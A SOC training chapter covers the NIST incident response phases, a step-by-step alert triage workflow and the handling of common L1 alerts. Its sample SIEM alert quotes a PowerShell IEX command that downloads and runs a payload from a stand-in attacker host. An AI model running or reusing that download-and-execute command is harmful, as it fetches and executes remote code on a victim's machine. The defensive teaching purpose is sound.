# 9. Incident Response & SOC Operations

## Incident Response Phases (NIST)

### 1. Preparation

- **Goal**: Ready defenses before incident occurs.
- **Activities**:
    - Deploy EDR, SIEM, logging.
    - Create playbooks for common incidents.
    - Train SOC team.
    - Establish communication channels.
    - Backup critical systems.
- **SOC L1 Role**: Understand your tools (SIEM queries, EDR capabilities).


### 2. Detection and Analysis

- **Goal**: Identify incident; gather initial info.
- **Activities**:
    - Monitor alerts.
    - Triage (is this real? what severity?).
    - Collect logs, artifacts.
    - Timeline creation.
    - Hypothesis formation.
- **SOC L1 Core Activity**: Triage, initial investigation, escalation.


### 3. Containment

- **Goal**: Stop spread; limit damage.
- **Short-term**: Isolate affected system from network.
- **Long-term**: Patch vulnerability, update firewall rules.
- **SOC L1 Role**: Alert escalation team; may assist with isolation.


### 4. Eradication

- **Goal**: Remove attacker access; eliminate malware.
- **Activities**:
    - Remove backdoors, malware.
    - Patch vulnerabilities.
    - Force password reset.
    - Update firewall/network rules.
- **SOC L1 Role**: Collect evidence; support forensics team.


### 5. Recovery

- **Goal**: Restore systems to normal.
- **Activities**:
    - Restore from clean backups.
    - Rebuild systems.
    - Restore data.
    - Validate integrity.
- **SOC L1 Role**: Monitor for re-infection during recovery.


### 6. Post-Incident Activities

- **Goal**: Learn; improve.
- **Activities**:
    - Root cause analysis.
    - Document lessons learned.
    - Update procedures.
    - Share threat intel.
- **SOC L1 Role**: Contribute observations; suggest improvements.

---

## SOC Triage Workflow

### Step 1: Alert Received

```
SIEM Alert: "PowerShell with IEX Detected"
  - Alert Title
  - Timestamp: 2024-01-15 14:32:00 UTC
  - Severity: High
  - Source IP: 192.168.1.100 (workstation)
  - Event ID: 4688 (Process Creation)
  - Command: powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')"
```


### Step 2: Contextualize

```
Questions to Ask:
1. Is source IP known? Check inventory.
   → 192.168.1.100 = John_Workstation (marketing dept).
   
2. Is user John expected to use PowerShell?
   → Marketing role, typically uses email/Office. PowerShell unusual.
   
3. When was this activity?
   → 2:32 PM on workday. John working hours (plausible).
   
4. Any related alerts on this host?
   → 15 failed logins from 192.168.1.100 in last hour (brute force!).
   → File created: C:\Temp\malware.exe.
```


### Step 3: Severity Assessment

```
Factors:
- Suspicious command (IEX = code execution): HIGH RISK.
- Brute force attempt preceding activity: Indicates compromise.
- Attacker C2 domain in command: Confirmed malicious.
- Financial data access possible from workstation: HIGH IMPACT.

Severity: CRITICAL.
```


### Step 4: Initial Action

```
Immediate:
- Isolate workstation from network.
- Block attacker C2 domain at firewall.
- Alert user (avoid panic).
- Notify manager.
- Create incident ticket.

Investigation:
- Check EDR data (process tree, network connections, file access).
- Check logs from network appliances (firewall, proxy).
- Identify compromised user account.
- Search SIEM for similar activity on other hosts.
```


### Step 5: Escalation

```
Escalate to:
- Incident Response Team (full investigation).
- Security Engineer (policy/rule updates).
- Management/Legal (regulatory requirements, communication).
- Affected Users (password reset, device cleanup).
```


---

## Common SOC L1 Alerts & Handling

### 1. Brute Force Login Attempts

**Alert**: Multiple failed logins from external IP.

**Triage**:

- Is IP on known VPN? → Legitimate (likely user forgot password).
- Is IP from company's usual location? → Likely legitimate.
- Is account a service account? → Check if auto-retry (legitimate).
- Any successful login after failures? → Compromise suspected.

**Action**: Lock account; force password reset; notify user.

### 2. Suspicious File Created in System Directory

**Alert**: C:\Windows\Temp\malware.exe created.

**Triage**:

- Is process creator known? (Check parent process)
- Is file signed? (Check digital signature)
- Does file hash match known malware?
- Does file trigger EDR alert?

**Action**: Quarantine file; scan host; investigate parent process.

### 3. Unusual Outbound Network Connection

**Alert**: Workstation connecting to 192.0.2.1:443 (high-risk IP).

**Triage**:

- What process initiated connection?
- Is destination IP on blocklist?
- Is destination IP hosting known malware?
- Is traffic encrypted (normal HTTPS) or abnormal protocol?

**Action**: Block destination; investigate process; check for beaconing pattern.

### 4. Large Data Transfer

**Alert**: User downloaded 5 GB from file server to USB.

**Triage**:

- Is user authorized for this data? (Check job role)
- Is transfer unusual for this user? (Baseline)
- What files transferred? (Sensitive?)
- Where is USB? (User still has it?)

**Action**: Quarantine user's device; retrieve USB; investigate data leakage intent.

---

---

[Index](../README.md) | [Previous: Attack Frameworks (Kill Chain, MITRE, Pyramid of Pain)](08-attack-frameworks.md) | [Next: Authentication & Access Control (MFA, Kerberos, OAuth)](10-authentication-access-control.md)
